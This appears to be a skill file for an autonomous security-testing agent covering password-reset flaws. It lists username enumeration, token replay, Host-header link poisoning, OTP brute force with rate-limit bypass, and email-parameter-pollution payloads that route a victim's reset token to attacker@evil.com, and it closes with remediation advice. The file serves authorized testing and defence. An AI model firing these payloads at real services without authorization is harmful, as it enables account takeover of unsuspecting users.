---
name: hunt-forgot-password
description: "Hunt Forgot Password / Account Recovery Authentication Flaws — 5 distinct patterns: (1) username enumeration via different responses for valid vs invalid email, (2) reset token exposed directly in the API response body, (3) reset token not invalidated after use (replay), (4) password reset link works from a different IP/browser (no binding), (5) no rate limit on the reset request endpoint. These are the standalone recovery-flow broken-auth primitives — distinct from reset-email host-header poisoning (hunt-host-header) and the full ATO chain (hunt-ato owns password-reset as an ATO path; prove the primitive here, chain it there). Detection: trace the full forgot-password flow from request to token to use; check response diffs between valid/invalid emails; test token replay after consumption. Medium to High (enumeration=Medium, token-reuse=High, account-takeover=Critical when chained to known-email)."
sources: hackerone_public, public_research, owasp_asvs
report_count: 6
cwe: [CWE-640, CWE-204, CWE-312, CWE-307, CWE-640]
cvss_baseline: "Low-Medium (5.3) username enumeration → High (8.1) token replay/leak → Critical (9.1) full ATO against a known email. Rate-limit-only = Low unless it gates a brute-forceable OTP."
related_skills: [hunt-ato, hunt-host-header, hunt-brute-force, hunt-auth-bypass, hunt-mfa-bypass, hunt-race-condition]
---

## Autonomous Testing Priority

**Start with username enumeration — it's the fastest win and gates the rest.**

**Pattern 1 — Username enumeration (response difference for valid vs invalid email):**
1. POST to the forgot-password endpoint with a clearly invalid email (e.g. `nonexistent@fakedomain12345.com`) — record the response body, status code, and length
2. POST with an email you know exists (or try common patterns like `admin@target.com`, `test@target.com`, `user@target.com`)
3. Compare responses: different message ("Email sent" vs "Email not found"), different HTTP status, or meaningfully different body length = username enumeration confirmed
4. Proof: enumeration is confirmed when the two responses differ measurably (baseline vs probe) in message text, status code, or body length

**Pattern 2 — Reset token exposed in the API response:**
Some APIs return the reset token directly in the response body (instead of only emailing it). POST to the forgot-password endpoint and look for a token, link, or code in the JSON/HTML response. If a token appears that lets you reset the password, that's an immediate account-takeover vector.

**Pattern 3 — Reset token replay (reuse after use):**
1. Complete a full password reset cycle: request token → use it to reset password
2. Immediately try submitting the same token again to the reset-password endpoint
3. If the second submission returns 200 or "success" → token not invalidated after use

**Pattern 4 — No rate limit on reset requests:**
Submit the forgot-password endpoint 10-20 times rapidly with the same email. If all succeed without a 429, lockout, or CAPTCHA → no rate limit (enumeration + token flooding is possible).

**Content-type:** Forgot-password endpoints are often JSON-based REST APIs. Use `application/x-www-form-urlencoded` only if the endpoint is a traditional HTML form (check the login page's HTML to determine form encoding).

**Proof:** Username enumeration = measurably different response (body/status/length). Token exposure = token in response body. Token replay = second successful use of a consumed token.

---

## Vulnerability Classes in This Skill

### 1. Username Enumeration via Password Reset
Different error messages for valid vs invalid accounts leaks the user list without authentication. Even timing differences (fast "no user found" vs slow "email queued") count.

High-value targets: admin accounts, employee email patterns, API keys derived from usernames.

### 2. Weak / Predictable Reset Tokens
A reset token derived from timestamp, username, or sequential IDs can be brute-forced:
- `base64(email + timestamp)` — decodable
- 4-6 digit numeric code — 10K guesses, easily feasible with no rate limit
- Sequential `token=1234`, `token=1235` — trivially enumerable

### 3. Token Not Bound to Session or IP
Most apps generate a token, email it, and accept it from any browser. A truly bound token should only work from the same IP or require the original session cookie. If neither is enforced → link forwarding = account takeover.

**Token leak via `Referer` / third-party resources.** When the token rides in the reset-page URL (`/reset?token=…`) and that page loads any cross-origin resource (analytics, ads, fonts, a CDN image), the full URL — token included — leaks to that third party in the `Referer` header. Check the reset page's outbound requests: if the token appears in any cross-origin `Referer`, it's harvestable without the victim's inbox. Same leak via a `<meta name=referrer>` misconfig or an outbound link the victim clicks from the reset page. Disclosed token-leak→ATO class: <https://hackerone.com/reports/173551>.

### 4. Reset Link Doesn't Expire
Common best practice: reset tokens expire within ~15–60 minutes (no hard RFC mandates the exact value; OWASP recommends a short, single-use lifetime). If a token from 24 hours ago still works → persistence risk for phishing attacks.

### 5. No Rate Limit on Reset Endpoint
An uncapped reset endpoint enables:
- Email flooding (DoS against victim's inbox)
- Token brute-force if the token space is small
- Username enumeration at scale

---

## New Techniques (2024-2026)

### 6. Email parameter pollution (dual-delivery → token to attacker)
When the reset endpoint accepts the email in a way the mailer and the token-owner lookup read differently, you can bind the token to the victim but deliver it to yourself. Try every shape:
```
email=victim@target.com&email=attacker@evil.com        # HPP — last/first wins differs per parser
email[]=victim@target.com&email[]=attacker@evil.com     # array injection
{"email":["victim@target.com","attacker@evil.com"]}     # JSON array
email=victim@target.com%0acc:attacker@evil.com          # CR/LF header injection into mail
email=victim@target.com,attacker@evil.com               # comma-list parsed as multi-recipient
email="victim@target.com"@evil.com / victim@target.com@evil.com   # RFC-5322 display-name / routing abuse
```
Confirm: the reset email for the *victim's* account arrives in the attacker inbox → full ATO. This is the single highest-value reset primitive in 2024-2026 and bypasses host-header fixes entirely.

### 7. Host / X-Forwarded-Host reset-link poisoning
If the reset link's domain is built from the request `Host` (or `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`), the token link points at an attacker domain; when the victim clicks it, the token hits the attacker. Primitive lives here; the full mechanics are owned by `hunt-host-header`. Also test **dangling-markup / absolute-URL override** in the forwarded host.

### 8. OTP / numeric-code brute (rate-limit + lockout bypass)
Many flows switch to a 4-6 digit OTP. Keyspace is 10^4-10^6 — brute-forceable if rate limiting is missing or bypassable. Combine with `hunt-brute-force` bypasses: `X-Forwarded-For` rotation, concurrency windows (fire 100 parallel guesses before the counter increments — overlaps with `hunt-race-condition`), per-email vs per-IP counter confusion, and resetting the counter by re-requesting a new code.

### 9. Token reuse across accounts / token-not-bound-to-account
Request a reset token for *your own* account, then submit it against the *victim's* account-id/email on the confirm step (`{"token":"MY_TOKEN","email":"victim@target.com","password":"..."}`). If the server validates the token's existence but not its binding to the submitted account → ATO with a self-issued token.

### 10. Reset race condition (TOCTOU)
Fire the "consume token + set password" request concurrently (10-50x) or race token-generation so two valid tokens exist, or set-password twice to skip invalidation. Pairs with `hunt-race-condition`.

### 11. Token leak via open redirect / referrer in the reset link
If the reset page contains an open redirect (`/reset?token=X&next=//evil`) or loads cross-origin resources, the token leaks via `Referer` or the redirect. Cross-ref `hunt-open-redirect`. (Existing Pattern-3 Referer note applies.)

### 12. Response-based token/length oracle
Even when the token isn't in the body, compare response timing/length/status for "valid vs already-used vs expired vs wrong" token to build a validity oracle that accelerates brute-force.

## Tooling

- **Burp Intruder / Turbo Intruder** — OTP brute and HPP permutations; Turbo Intruder for the race/concurrency window.
- **ffuf** — numeric OTP keyspace with `-w <(seq -w 0 999999)` style wordlists (authorized, rate-limited).
- **Burp Collaborator** — confirm out-of-band token delivery (host-header poisoning, mail CC injection).
- Two test accounts + a controlled inbox (catch-all domain) to prove cross-account delivery safely.

## Remediation

- Return an identical generic response for valid and invalid emails ("If an account exists, we've sent a link"); equalise timing.
- Single, server-generated, 128-bit random token; single-use; short expiry; invalidated on use and on password change; bound to the account server-side (never trust a client-supplied account id/email at the confirm step).
- Build the reset-link host from a server-side allowlist, never from `Host`/`X-Forwarded-*`.
- Reject multi-valued email params; canonicalise to exactly one recipient derived from the stored account.
- Rate-limit + lockout per-account AND per-IP; CAPTCHA after N failures; never expose OTP keyspace < 10^8 without strict throttling.

## Validation Gate

1. **Enumeration:** two measurably different responses (text/status/length/timing) for valid vs invalid email.
2. **Token issue:** demonstrate a real takeover of test account B — token delivered to or usable by attacker, password changed, login confirmed.
3. **No reliance on pre-existing state** — reproducible with two fresh accounts in under 10 minutes.

## Disclosed Report Patterns

Verify the exact report before quoting an ID/amount.
- **Reset-link token leak via Referer/third-party resource → ATO** — classic token-in-URL leakage class (e.g. HackerOne #173551-style).
- **Email parameter pollution → reset email to attacker** — recurring medium/high H1 pattern across SaaS reset endpoints.
- **Host-header reset poisoning** — see `hunt-host-header` for the canonical disclosed cases.

---

## Related Skills

- **`hunt-ato`** — owns the account-takeover CHAIN (password-reset is its path #1). This skill finds/proves the recovery-flow primitive; hand off to hunt-ato to assemble the full takeover.
- **`hunt-cache-poison`** — host-header injection during reset email generation (different vulnerability, same flow)
- **`hunt-brute-force`** — rate-limit testing pattern applies to the reset endpoint too
- **`hunt-auth-bypass`** — if the reset flow can be skipped entirely (go to `/reset-password?token=` with empty/null token)
- **`hunt-mfa-bypass`** — if MFA is required after reset, test the bypass there
